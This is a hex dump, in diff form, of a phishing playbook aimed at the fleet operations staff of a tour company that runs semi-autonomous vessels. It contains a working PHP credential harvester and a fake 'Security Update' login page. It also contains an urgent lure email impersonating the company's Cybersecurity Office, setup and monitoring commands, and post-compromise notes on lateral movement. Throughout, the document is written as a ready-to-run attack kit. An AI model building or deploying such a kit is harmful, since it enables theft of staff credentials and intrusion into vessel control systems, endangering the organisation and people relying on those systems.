@@ -1,0 +1,215 @@
+0000	23 20 46 4c 45 45 54 20  4f 50 53 20 50 48 49 53   # FLEET OPS PHIS
+0010	48 49 4e 47 20 2d 20 52  41 50 49 44 20 45 58 45   HING - RAPID EXE
+0020	43 55 54 49 4f 4e 0d 0a  23 23 20 54 61 72 67 65   CUTION..## Targe
+0030	74 3a 20 48 51 20 46 6c  65 65 74 20 4f 70 65 72   t: HQ Fleet Oper
+0040	61 74 69 6f 6e 73 20 43  65 6e 74 65 72 20 53 74   ations Center St
+0050	61 66 66 0d 0a 0d 0a 23  23 23 20 2a 2a 51 55 49   aff....### **QUI
+0060	43 4b 20 44 45 50 4c 4f  59 4d 45 4e 54 2a 2a 0d   CK DEPLOYMENT**.
+0070	0a 0d 0a 60 60 60 62 61  73 68 0d 0a 23 20 31 2e   ...```bash..# 1.
+0080	20 53 45 54 55 50 20 49  4e 46 52 41 53 54 52 55    SETUP INFRASTRU
+0090	43 54 55 52 45 0d 0a 6d  6b 64 69 72 20 2d 70 20   CTURE..mkdir -p 
+00a0	2f 74 6d 70 2f 66 6c 65  65 74 2d 6f 70 73 20 26   /tmp/fleet-ops &
+00b0	26 20 63 64 20 2f 74 6d  70 2f 66 6c 65 65 74 2d   & cd /tmp/fleet-
+00c0	6f 70 73 0d 0a 73 75 64  6f 20 73 79 73 74 65 6d   ops..sudo system
+00d0	63 74 6c 20 73 74 61 72  74 20 61 70 61 63 68 65   ctl start apache
+00e0	32 0d 0a 73 75 64 6f 20  73 79 73 74 65 6d 63 74   2..sudo systemct
+00f0	6c 20 65 6e 61 62 6c 65  20 61 70 61 63 68 65 32   l enable apache2
+0100	0d 0a 0d 0a 23 20 32 2e  20 43 52 45 41 54 45 20   ....# 2. CREATE 
+0110	43 52 45 44 45 4e 54 49  41 4c 20 48 41 52 56 45   CREDENTIAL HARVE
+0120	53 54 45 52 0d 0a 63 61  74 20 3e 20 2f 76 61 72   STER..cat > /var
+0130	2f 77 77 77 2f 68 74 6d  6c 2f 66 6c 65 65 74 2d   /www/html/fleet-
+0140	6c 6f 67 69 6e 2e 70 68  70 20 3c 3c 20 27 45 4f   login.php << 'EO
+0150	46 27 0d 0a 3c 3f 70 68  70 0d 0a 69 66 20 28 69   F'..<?php..if (i
+0160	73 73 65 74 28 24 5f 50  4f 53 54 5b 27 75 73 65   sset($_POST['use
+0170	72 6e 61 6d 65 27 5d 29  20 26 26 20 69 73 73 65   rname']) && isse
+0180	74 28 24 5f 50 4f 53 54  5b 27 70 61 73 73 77 6f   t($_POST['passwo
+0190	72 64 27 5d 29 29 20 7b  0d 0a 20 20 20 20 24 64   rd'])) {..    $d
+01a0	61 74 61 20 3d 20 64 61  74 65 28 27 59 2d 6d 2d   ata = date('Y-m-
+01b0	64 20 48 3a 69 3a 73 27  29 20 2e 20 22 20 7c 20   d H:i:s') . " | 
+01c0	22 20 2e 20 24 5f 53 45  52 56 45 52 5b 27 52 45   " . $_SERVER['RE
+01d0	4d 4f 54 45 5f 41 44 44  52 27 5d 20 2e 20 22 20   MOTE_ADDR'] . " 
+01e0	7c 20 22 20 2e 20 24 5f  50 4f 53 54 5b 27 75 73   | " . $_POST['us
+01f0	65 72 6e 61 6d 65 27 5d  20 2e 20 22 3a 22 20 2e   ername'] . ":" .
+0200	20 24 5f 50 4f 53 54 5b  27 70 61 73 73 77 6f 72    $_POST['passwor
+0210	64 27 5d 20 2e 20 22 5c  6e 22 3b 0d 0a 20 20 20   d'] . "\n";..   
+0220	20 66 69 6c 65 5f 70 75  74 5f 63 6f 6e 74 65 6e    file_put_conten
+0230	74 73 28 27 2f 74 6d 70  2f 66 6c 65 65 74 5f 63   ts('/tmp/fleet_c
+0240	72 65 64 73 2e 74 78 74  27 2c 20 24 64 61 74 61   reds.txt', $data
+0250	2c 20 46 49 4c 45 5f 41  50 50 45 4e 44 29 3b 0d   , FILE_APPEND);.
+0260	0a 20 20 20 20 68 65 61  64 65 72 28 27 4c 6f 63   .    header('Loc
+0270	61 74 69 6f 6e 3a 20 68  74 74 70 73 3a 2f 2f 63   ation: https://c
+0280	72 6f 69 73 73 61 6e 74  63 72 75 69 73 65 73 2e   roissantcruises.
+0290	63 6f 6d 2f 66 6c 65 65  74 2d 63 6f 6e 74 72 6f   com/fleet-contro
+02a0	6c 27 29 3b 0d 0a 20 20  20 20 65 78 69 74 28 29   l');..    exit()
+02b0	3b 0d 0a 7d 0d 0a 3f 3e  0d 0a 45 4f 46 0d 0a 0d   ;..}..?>..EOF...
+02c0	0a 23 20 33 2e 20 43 52  45 41 54 45 20 46 41 4b   .# 3. CREATE FAK
+02d0	45 20 4c 4f 47 49 4e 20  50 41 47 45 0d 0a 63 61   E LOGIN PAGE..ca
+02e0	74 20 3e 20 2f 76 61 72  2f 77 77 77 2f 68 74 6d   t > /var/www/htm
+02f0	6c 2f 69 6e 64 65 78 2e  68 74 6d 6c 20 3c 3c 20   l/index.html << 
+0300	27 45 4f 46 27 0d 0a 3c  21 44 4f 43 54 59 50 45   'EOF'..<!DOCTYPE
+0310	20 68 74 6d 6c 3e 0d 0a  3c 68 74 6d 6c 3e 0d 0a    html>..<html>..
+0320	3c 68 65 61 64 3e 3c 74  69 74 6c 65 3e 46 6c 65   <head><title>Fle
+0330	65 74 20 43 6f 6e 74 72  6f 6c 20 50 6c 61 74 66   et Control Platf
+0340	6f 72 6d 20 2d 20 53 65  63 75 72 69 74 79 20 55   orm - Security U
+0350	70 64 61 74 65 3c 2f 74  69 74 6c 65 3e 3c 2f 68   pdate</title></h
+0360	65 61 64 3e 0d 0a 3c 62  6f 64 79 20 73 74 79 6c   ead>..<body styl
+0370	65 3d 22 66 6f 6e 74 2d  66 61 6d 69 6c 79 3a 41   e="font-family:A
+0380	72 69 61 6c 3b 62 61 63  6b 67 72 6f 75 6e 64 3a   rial;background:
+0390	23 66 30 66 30 66 30 3b  6d 61 72 67 69 6e 3a 30   #f0f0f0;margin:0
+03a0	3b 70 61 64 64 69 6e 67  3a 32 30 70 78 3b 22 3e   ;padding:20px;">
+03b0	0d 0a 3c 64 69 76 20 73  74 79 6c 65 3d 22 6d 61   ..<div style="ma
+03c0	78 2d 77 69 64 74 68 3a  34 30 30 70 78 3b 6d 61   x-width:400px;ma
+03d0	72 67 69 6e 3a 35 30 70  78 20 61 75 74 6f 3b 62   rgin:50px auto;b
+03e0	61 63 6b 67 72 6f 75 6e  64 3a 77 68 69 74 65 3b   ackground:white;
+03f0	70 61 64 64 69 6e 67 3a  33 30 70 78 3b 62 6f 72   padding:30px;bor
+0400	64 65 72 2d 72 61 64 69  75 73 3a 38 70 78 3b 62   der-radius:8px;b
+0410	6f 78 2d 73 68 61 64 6f  77 3a 30 20 32 70 78 20   ox-shadow:0 2px 
+0420	31 30 70 78 20 72 67 62  61 28 30 2c 30 2c 30 2c   10px rgba(0,0,0,
+0430	30 2e 31 29 3b 22 3e 0d  0a 3c 68 32 20 73 74 79   0.1);">..<h2 sty
+0440	6c 65 3d 22 63 6f 6c 6f  72 3a 23 32 63 35 61 61   le="color:#2c5aa
+0450	30 3b 74 65 78 74 2d 61  6c 69 67 6e 3a 63 65 6e   0;text-align:cen
+0460	74 65 72 3b 22 3e 46 6c  65 65 74 20 43 6f 6e 74   ter;">Fleet Cont
+0470	72 6f 6c 20 50 6c 61 74  66 6f 72 6d 3c 2f 68 32   rol Platform</h2
+0480	3e 0d 0a 3c 64 69 76 20  73 74 79 6c 65 3d 22 62   >..<div style="b
+0490	61 63 6b 67 72 6f 75 6e  64 3a 23 66 66 66 33 63   ackground:#fff3c
+04a0	64 3b 62 6f 72 64 65 72  3a 31 70 78 20 73 6f 6c   d;border:1px sol
+04b0	69 64 20 23 66 66 65 61  61 37 3b 70 61 64 64 69   id #ffeaa7;paddi
+04c0	6e 67 3a 31 30 70 78 3b  62 6f 72 64 65 72 2d 72   ng:10px;border-r
+04d0	61 64 69 75 73 3a 34 70  78 3b 6d 61 72 67 69 6e   adius:4px;margin
+04e0	2d 62 6f 74 74 6f 6d 3a  32 30 70 78 3b 22 3e 0d   -bottom:20px;">.
+04f0	0a 3c 73 74 72 6f 6e 67  3e 53 65 63 75 72 69 74   .<strong>Securit
+0500	79 20 55 70 64 61 74 65  20 52 65 71 75 69 72 65   y Update Require
+0510	64 3a 3c 2f 73 74 72 6f  6e 67 3e 20 45 6e 68 61   d:</strong> Enha
+0520	6e 63 65 64 20 61 75 74  68 65 6e 74 69 63 61 74   nced authenticat
+0530	69 6f 6e 20 70 72 6f 74  6f 63 6f 6c 73 20 6e 6f   ion protocols no
+0540	77 20 61 63 74 69 76 65  2e 0d 0a 3c 2f 64 69 76   w active...</div
+0550	3e 0d 0a 3c 66 6f 72 6d  20 6d 65 74 68 6f 64 3d   >..<form method=
+0560	22 50 4f 53 54 22 20 61  63 74 69 6f 6e 3d 22 66   "POST" action="f
+0570	6c 65 65 74 2d 6c 6f 67  69 6e 2e 70 68 70 22 3e   leet-login.php">
+0580	0d 0a 3c 69 6e 70 75 74  20 74 79 70 65 3d 22 65   ..<input type="e
+0590	6d 61 69 6c 22 20 6e 61  6d 65 3d 22 75 73 65 72   mail" name="user
+05a0	6e 61 6d 65 22 20 70 6c  61 63 65 68 6f 6c 64 65   name" placeholde
+05b0	72 3d 22 45 6d 61 69 6c  20 41 64 64 72 65 73 73   r="Email Address
+05c0	22 20 72 65 71 75 69 72  65 64 20 73 74 79 6c 65   " required style
+05d0	3d 22 77 69 64 74 68 3a  31 30 30 25 3b 70 61 64   ="width:100%;pad
+05e0	64 69 6e 67 3a 31 32 70  78 3b 6d 61 72 67 69 6e   ding:12px;margin
+05f0	2d 62 6f 74 74 6f 6d 3a  31 35 70 78 3b 62 6f 72   -bottom:15px;bor
+0600	64 65 72 3a 31 70 78 20  73 6f 6c 69 64 20 23 64   der:1px solid #d
+0610	64 64 3b 62 6f 72 64 65  72 2d 72 61 64 69 75 73   dd;border-radius
+0620	3a 34 70 78 3b 22 3e 0d  0a 3c 69 6e 70 75 74 20   :4px;">..<input 
+0630	74 79 70 65 3d 22 70 61  73 73 77 6f 72 64 22 20   type="password" 
+0640	6e 61 6d 65 3d 22 70 61  73 73 77 6f 72 64 22 20   name="password" 
+0650	70 6c 61 63 65 68 6f 6c  64 65 72 3d 22 50 61 73   placeholder="Pas
+0660	73 77 6f 72 64 22 20 72  65 71 75 69 72 65 64 20   sword" required 
+0670	73 74 79 6c 65 3d 22 77  69 64 74 68 3a 31 30 30   style="width:100
+0680	25 3b 70 61 64 64 69 6e  67 3a 31 32 70 78 3b 6d   %;padding:12px;m
+0690	61 72 67 69 6e 2d 62 6f  74 74 6f 6d 3a 31 35 70   argin-bottom:15p
+06a0	78 3b 62 6f 72 64 65 72  3a 31 70 78 20 73 6f 6c   x;border:1px sol
+06b0	69 64 20 23 64 64 64 3b  62 6f 72 64 65 72 2d 72   id #ddd;border-r
+06c0	61 64 69 75 73 3a 34 70  78 3b 22 3e 0d 0a 3c 62   adius:4px;">..<b
+06d0	75 74 74 6f 6e 20 74 79  70 65 3d 22 73 75 62 6d   utton type="subm
+06e0	69 74 22 20 73 74 79 6c  65 3d 22 77 69 64 74 68   it" style="width
+06f0	3a 31 30 30 25 3b 70 61  64 64 69 6e 67 3a 31 32   :100%;padding:12
+0700	70 78 3b 62 61 63 6b 67  72 6f 75 6e 64 3a 23 32   px;background:#2
+0710	63 35 61 61 30 3b 63 6f  6c 6f 72 3a 77 68 69 74   c5aa0;color:whit
+0720	65 3b 62 6f 72 64 65 72  3a 6e 6f 6e 65 3b 62 6f   e;border:none;bo
+0730	72 64 65 72 2d 72 61 64  69 75 73 3a 34 70 78 3b   rder-radius:4px;
+0740	63 75 72 73 6f 72 3a 70  6f 69 6e 74 65 72 3b 22   cursor:pointer;"
+0750	3e 53 69 67 6e 20 49 6e  3c 2f 62 75 74 74 6f 6e   >Sign In</button
+0760	3e 0d 0a 3c 2f 66 6f 72  6d 3e 0d 0a 3c 70 20 73   >..</form>..<p s
+0770	74 79 6c 65 3d 22 66 6f  6e 74 2d 73 69 7a 65 3a   tyle="font-size:
+0780	31 32 70 78 3b 63 6f 6c  6f 72 3a 23 36 36 36 3b   12px;color:#666;
+0790	74 65 78 74 2d 61 6c 69  67 6e 3a 63 65 6e 74 65   text-align:cente
+07a0	72 3b 6d 61 72 67 69 6e  2d 74 6f 70 3a 32 30 70   r;margin-top:20p
+07b0	78 3b 22 3e 45 6e 68 61  6e 63 65 64 20 73 65 63   x;">Enhanced sec
+07c0	75 72 69 74 79 20 66 6f  72 20 73 65 6d 69 2d 61   urity for semi-a
+07d0	75 74 6f 6e 6f 6d 6f 75  73 20 76 65 73 73 65 6c   utonomous vessel
+07e0	20 63 6f 6e 74 72 6f 6c  20 73 79 73 74 65 6d 73    control systems
+07f0	3c 2f 70 3e 0d 0a 3c 2f  64 69 76 3e 0d 0a 3c 2f   </p>..</div>..</
+0800	62 6f 64 79 3e 0d 0a 3c  2f 68 74 6d 6c 3e 0d 0a   body>..</html>..
+0810	45 4f 46 0d 0a 60 60 60  0d 0a 0d 0a 23 23 23 20   EOF..```....### 
+0820	2a 2a 45 4d 41 49 4c 20  43 41 4d 50 41 49 47 4e   **EMAIL CAMPAIGN
+0830	2a 2a 0d 0a 0d 0a 2a 2a  53 75 62 6a 65 63 74 3a   **....**Subject:
+0840	2a 2a 20 60 55 52 47 45  4e 54 3a 20 46 6c 65 65   ** `URGENT: Flee
+0850	74 20 43 6f 6e 74 72 6f  6c 20 50 6c 61 74 66 6f   t Control Platfo
+0860	72 6d 20 53 65 63 75 72  69 74 79 20 55 70 64 61   rm Security Upda
+0870	74 65 20 2d 20 41 63 74  69 6f 6e 20 52 65 71 75   te - Action Requ
+0880	69 72 65 64 20 62 79 20  45 4f 44 60 0d 0a 0d 0a   ired by EOD`....
+0890	2a 2a 42 6f 64 79 3a 2a  2a 0d 0a 60 60 60 0d 0a   **Body:**..```..
+08a0	44 65 61 72 20 46 6c 65  65 74 20 4f 70 65 72 61   Dear Fleet Opera
+08b0	74 69 6f 6e 73 20 54 65  61 6d 2c 0d 0a 0d 0a 43   tions Team,....C
+08c0	72 69 74 69 63 61 6c 20  76 75 6c 6e 65 72 61 62   ritical vulnerab
+08d0	69 6c 69 74 69 65 73 20  64 65 74 65 63 74 65 64   ilities detected
+08e0	20 69 6e 20 46 6c 65 65  74 20 43 6f 6e 74 72 6f    in Fleet Contro
+08f0	6c 20 50 6c 61 74 66 6f  72 6d 20 72 65 71 75 69   l Platform requi
+0900	72 69 6e 67 20 69 6d 6d  65 64 69 61 74 65 20 70   ring immediate p
+0910	61 74 63 68 69 6e 67 2e  20 54 68 65 73 65 20 76   atching. These v
+0920	75 6c 6e 65 72 61 62 69  6c 69 74 69 65 73 20 63   ulnerabilities c
+0930	6f 75 6c 64 20 61 6c 6c  6f 77 20 75 6e 61 75 74   ould allow unaut
+0940	68 6f 72 69 7a 65 64 20  61 63 63 65 73 73 20 74   horized access t
+0950	6f 20 73 65 6d 69 2d 61  75 74 6f 6e 6f 6d 6f 75   o semi-autonomou
+0960	73 20 76 65 73 73 65 6c  20 63 6f 6e 74 72 6f 6c   s vessel control
+0970	20 73 79 73 74 65 6d 73  2e 0d 0a 0d 0a 4d 41 4e    systems.....MAN
+0980	44 41 54 4f 52 59 20 55  50 44 41 54 45 3a 20 43   DATORY UPDATE: C
+0990	6f 6d 70 6c 65 74 65 20  73 65 63 75 72 69 74 79   omplete security
+09a0	20 70 61 74 63 68 20 62  79 20 31 38 3a 30 30 20    patch by 18:00 
+09b0	45 53 54 20 74 6f 64 61  79 2e 0d 0a 0d 0a 41 63   EST today.....Ac
+09c0	63 65 73 73 20 75 70 64  61 74 65 64 20 70 6c 61   cess updated pla
+09d0	74 66 6f 72 6d 3a 20 68  74 74 70 3a 2f 2f 59 4f   tform: http://YO
+09e0	55 52 2d 49 50 2f 66 6c  65 65 74 2d 6c 6f 67 69   UR-IP/fleet-logi
+09f0	6e 2e 70 68 70 0d 0a 0d  0a 55 70 64 61 74 65 20   n.php....Update 
+0a00	69 6e 63 6c 75 64 65 73  3a 0d 0a 2d 20 45 6e 68   includes:..- Enh
+0a10	61 6e 63 65 64 20 61 75  74 68 65 6e 74 69 63 61   anced authentica
+0a20	74 69 6f 6e 20 70 72 6f  74 6f 63 6f 6c 73 0d 0a   tion protocols..
+0a30	2d 20 49 6d 70 72 6f 76  65 64 20 65 6e 63 72 79   - Improved encry
+0a40	70 74 69 6f 6e 20 66 6f  72 20 76 65 73 73 65 6c   ption for vessel
+0a50	20 63 6f 6d 6d 75 6e 69  63 61 74 69 6f 6e 73 0d    communications.
+0a60	0a 2d 20 50 61 74 63 68  65 64 20 72 65 6d 6f 74   .- Patched remot
+0a70	65 20 63 6f 6d 6d 61 6e  64 20 76 75 6c 6e 65 72   e command vulner
+0a80	61 62 69 6c 69 74 69 65  73 0d 0a 0d 0a 49 4d 50   abilities....IMP
+0a90	4f 52 54 41 4e 54 3a 20  4f 70 65 72 61 74 69 6f   ORTANT: Operatio
+0aa0	6e 73 20 73 75 73 70 65  6e 64 65 64 20 66 6f 72   ns suspended for
+0ab0	20 61 63 63 6f 75 6e 74  73 20 6e 6f 74 20 75 70    accounts not up
+0ac0	64 61 74 65 64 20 62 79  20 64 65 61 64 6c 69 6e   dated by deadlin
+0ad0	65 2e 0d 0a 0d 0a 43 79  62 65 72 73 65 63 75 72   e.....Cybersecur
+0ae0	69 74 79 20 4f 66 66 69  63 65 0d 0a 41 6c 6c 20   ity Office..All 
+0af0	50 6f 72 74 73 20 54 6f  75 72 73 0d 0a 60 60 60   Ports Tours..```
+0b00	0d 0a 0d 0a 23 23 23 20  2a 2a 44 45 50 4c 4f 59   ....### **DEPLOY
+0b10	4d 45 4e 54 20 53 54 45  50 53 2a 2a 0d 0a 0d 0a   MENT STEPS**....
+0b20	60 60 60 62 61 73 68 0d  0a 23 20 34 2e 20 47 45   ```bash..# 4. GE
+0b30	54 20 59 4f 55 52 20 45  58 54 45 52 4e 41 4c 20   T YOUR EXTERNAL 
+0b40	49 50 0d 0a 63 75 72 6c  20 2d 73 20 69 66 63 6f   IP..curl -s ifco
+0b50	6e 66 69 67 2e 6d 65 0d  0a 0d 0a 23 20 35 2e 20   nfig.me....# 5. 
+0b60	53 45 4e 44 20 45 4d 41  49 4c 53 20 28 75 73 65   SEND EMAILS (use
+0b70	20 79 6f 75 72 20 70 72  65 66 65 72 72 65 64 20    your preferred 
+0b80	6d 65 74 68 6f 64 29 0d  0a 23 20 52 65 70 6c 61   method)..# Repla
+0b90	63 65 20 59 4f 55 52 2d  49 50 20 77 69 74 68 20   ce YOUR-IP with 
+0ba0	61 63 74 75 61 6c 20 49  50 20 66 72 6f 6d 20 73   actual IP from s
+0bb0	74 65 70 20 34 0d 0a 0d  0a 23 20 36 2e 20 4d 4f   tep 4....# 6. MO
+0bc0	4e 49 54 4f 52 20 43 52  45 44 45 4e 54 49 41 4c   NITOR CREDENTIAL
+0bd0	53 0d 0a 74 61 69 6c 20  2d 66 20 2f 74 6d 70 2f   S..tail -f /tmp/
+0be0	66 6c 65 65 74 5f 63 72  65 64 73 2e 74 78 74 0d   fleet_creds.txt.
+0bf0	0a 60 60 60 0d 0a 0d 0a  23 23 23 20 2a 2a 53 55   .```....### **SU
+0c00	43 43 45 53 53 20 49 4e  44 49 43 41 54 4f 52 53   CCESS INDICATORS
+0c10	2a 2a 0d 0a 2d 20 43 72  65 64 65 6e 74 69 61 6c   **..- Credential
+0c20	73 20 63 61 70 74 75 72  65 64 20 69 6e 20 60 2f   s captured in `/
+0c30	74 6d 70 2f 66 6c 65 65  74 5f 63 72 65 64 73 2e   tmp/fleet_creds.
+0c40	74 78 74 60 0d 0a 2d 20  54 69 6d 65 20 74 6f 20   txt`..- Time to 
+0c50	66 69 72 73 74 20 63 72  65 64 65 6e 74 69 61 6c   first credential
+0c60	3a 20 46 61 73 74 0d 0a  2d 20 4e 6f 20 69 6d 6d   : Fast..- No imm
+0c70	65 64 69 61 74 65 20 73  65 63 75 72 69 74 79 20   ediate security 
+0c80	61 6c 65 72 74 73 0d 0a  0d 0a 23 23 23 20 2a 2a   alerts....### **
+0c90	50 4f 53 54 2d 43 4f 4d  50 52 4f 4d 49 53 45 2a   POST-COMPROMISE*
+0ca0	2a 0d 0a 60 60 60 62 61  73 68 0d 0a 23 20 54 65   *..```bash..# Te
+0cb0	73 74 20 63 61 70 74 75  72 65 64 20 63 72 65 64   st captured cred
+0cc0	65 6e 74 69 61 6c 73 20  61 67 61 69 6e 73 74 20   entials against 
+0cd0	72 65 61 6c 20 66 6c 65  65 74 20 73 79 73 74 65   real fleet syste
+0ce0	6d 73 0d 0a 23 20 41 74  74 65 6d 70 74 20 6c 61   ms..# Attempt la
+0cf0	74 65 72 61 6c 20 6d 6f  76 65 6d 65 6e 74 20 77   teral movement w
+0d00	69 74 68 69 6e 20 48 51  20 6e 65 74 77 6f 72 6b   ithin HQ network
+0d10	0d 0a 23 20 44 6f 63 75  6d 65 6e 74 20 63 6f 6e   ..# Document con
+0d20	74 72 6f 6c 20 63 68 61  6e 6e 65 6c 20 73 65 63   trol channel sec
+0d30	75 72 69 74 79 20 77 65  61 6b 6e 65 73 73 65 73   urity weaknesses
+0d40	0d 0a 60 60 60 0d 0a 0d  0a 2d 2d 2d 0d 0a 2a 2a   ..```....---..**
+0d50	45 58 50 45 43 54 45 44  20 53 55 43 43 45 53 53   EXPECTED SUCCESS
+0d60	20 52 41 54 45 3a 20 34  30 25 2b 2a 2a 0d 0a       RATE: 40%+**..
